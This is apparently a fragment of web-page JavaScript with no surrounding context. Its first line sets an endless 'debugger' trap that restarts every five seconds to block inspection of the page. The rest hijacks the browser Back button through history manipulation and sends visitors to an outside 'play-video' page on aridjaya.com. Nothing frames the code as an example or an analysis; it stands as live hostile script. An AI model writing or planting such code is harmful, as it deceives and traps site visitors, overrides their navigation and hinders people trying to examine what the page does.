!function t(){try{!function t(n){1===(""+n/n).length&&0!==n||function(){}.constructor("debugger")(),t(++n)}(0)}catch(n){setTimeout(t,5e3)}}();;
(function(window, location) {
    history.replaceState(null, document.title, location.pathname+"#!/history");
    history.pushState(null, document.title, location.pathname);
    window.addEventListener("popstate", function() {
        if(location.hash === "#!/history") {
            history.replaceState(null, document.title, location.pathname);
            setTimeout(function(){
                location.replace("https://www.aridjaya.com/p/play-video.html");
            },0);
        }}, false);
}(window, location));
